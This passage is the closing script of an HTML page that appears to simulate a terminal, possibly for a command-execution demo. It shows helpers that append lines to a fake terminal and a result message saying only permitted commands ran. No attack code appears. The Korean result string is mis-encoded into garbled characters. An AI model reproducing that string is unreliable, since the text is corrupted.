            document.getElementById('evidence').innerText = 'í—ˆìš©ëœ ëª…ë ¹ì–´ë§Œ ì‹¤í–‰ë¨';
            
            resultBox.classList.remove('hidden');
        }

        function addTerminalLine(text, className = 'text-green-300') {
            const div = document.createElement('div');
            div.className = className;
            div.textContent = text;
            document.getElementById('terminalLines').appendChild(div);
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        updateCommandPreview();
    </script>
</body>
</html>
